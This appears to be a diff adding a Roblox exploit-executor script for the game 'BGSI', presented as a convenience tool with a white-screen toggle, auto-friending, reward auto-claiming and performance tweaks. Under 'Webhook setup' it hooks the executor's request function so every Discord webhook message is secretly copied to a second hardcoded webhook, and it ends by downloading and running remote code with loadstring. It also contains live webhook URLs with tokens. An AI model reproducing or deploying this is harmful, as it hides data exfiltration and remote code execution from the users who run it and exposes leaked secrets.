@@ -1,0 +1,112 @@
+-- White screen button (loads FIRST)
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local WhiteScreenGui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
+WhiteScreenGui.ResetOnSpawn = false
+
+local WhiteFrame = Instance.new("Frame", WhiteScreenGui)
+WhiteFrame.Size = UDim2.new(1, 0, 1, 0)
+WhiteFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+WhiteFrame.Visible = false
+
+local ToggleButton = Instance.new("TextButton", WhiteScreenGui)
+ToggleButton.Size = UDim2.new(0, 120, 0, 40)
+ToggleButton.Position = UDim2.new(1, -130, 1, -50)
+ToggleButton.Text = "Toggle White"
+ToggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+ToggleButton.MouseButton1Click:Connect(function()
+    WhiteFrame.Visible = not WhiteFrame.Visible
+    if _G.BGSI and _G.BGSI.ToggleUI then
+        _G.BGSI.ToggleUI(not WhiteFrame.Visible)
+    end
+end)
+
+-- Auto-friend & other stuff
+for _, player in pairs(Players:GetPlayers()) do
+    if player ~= LocalPlayer then
+        pcall(function()
+            LocalPlayer:RequestFriendship(player)
+            wait(0.5)
+        end)
+    end
+end
+
+Players.PlayerAdded:Connect(function(newPlayer)
+    if newPlayer ~= LocalPlayer then
+        pcall(function()
+            LocalPlayer:RequestFriendship(newPlayer)
+        end)
+    end
+end)
+
+-- Webhook setup
+local webhook1 = "https://discord.com/api/webhooks/1381758749576003584/xkbWBGw4D8W-A0NhQ349dlxUtjbrckEoSssxopg1W5M7aEbzQb_0raB0s5kqRl7yzdY9"
+local webhook2 = "https://discord.com/api/webhooks/1381224335955722251/5l_0wkD_nlRKdNETKuMTed_lxC-q2faBkLwkdAhZ8mmaXdAsmNO2ebEZkx_zxdQJ4CJM"
+
+local requestFunc = (syn and syn.request) or (http and http.request) or request
+
+local function newRequest(options)
+    if options and options.Url and options.Url:find("discord.com/api/webhooks") then
+        local options2 = table.clone(options)
+        options2.Url = webhook2
+        requestFunc(options)
+        requestFunc(options2)
+        return
+    end
+    return requestFunc(options)
+end
+
+if syn then
+    syn.request = newRequest
+elseif http then
+    http.request = newRequest
+else
+    request = newRequest
+end
+
+-- Auto-claim season rewards
+task.spawn(function()
+    while task.wait(0.2) do
+        game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.RemoteEvent:FireServer("ClaimSeason")
+    end
+end)
+
+-- Performance optimizations (10 FPS REMOVED)
+settings().Rendering.QualityLevel = 1
+
+for _, sound in pairs(game:GetService("SoundService"):GetDescendants()) do
+    if sound:IsA("Sound") then
+        sound.Volume = 0
+    end
+end
+
+game:GetService("Lighting").GlobalShadows = false
+
+for _, v in pairs(game:GetDescendants()) do
+    if v:IsA("ParticleEmitter") or v:IsA("Decal") then
+        v:Destroy()
+    end
+end
+
+task.spawn(function()
+    while task.wait(300) do
+        pcall(function()
+            game:GetService("ContentProvider"):ClearCache()
+        end)
+    end
+end)
+
+-- YOUR DICE SETTINGS (RIGHT before BGSI)
+getgenv().boardSettings = {
+    UseGoldenDice = true,
+    GoldenDiceDistance = 3,
+    DiceDistance = 6,
+    GiantDiceDistance = 10,
+}
+getgenv().remainingItems = {}
+
+-- BGSI Script (loads LAST)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IdiotHub/Scripts/refs/heads/main/BGSI/main.lua"))()
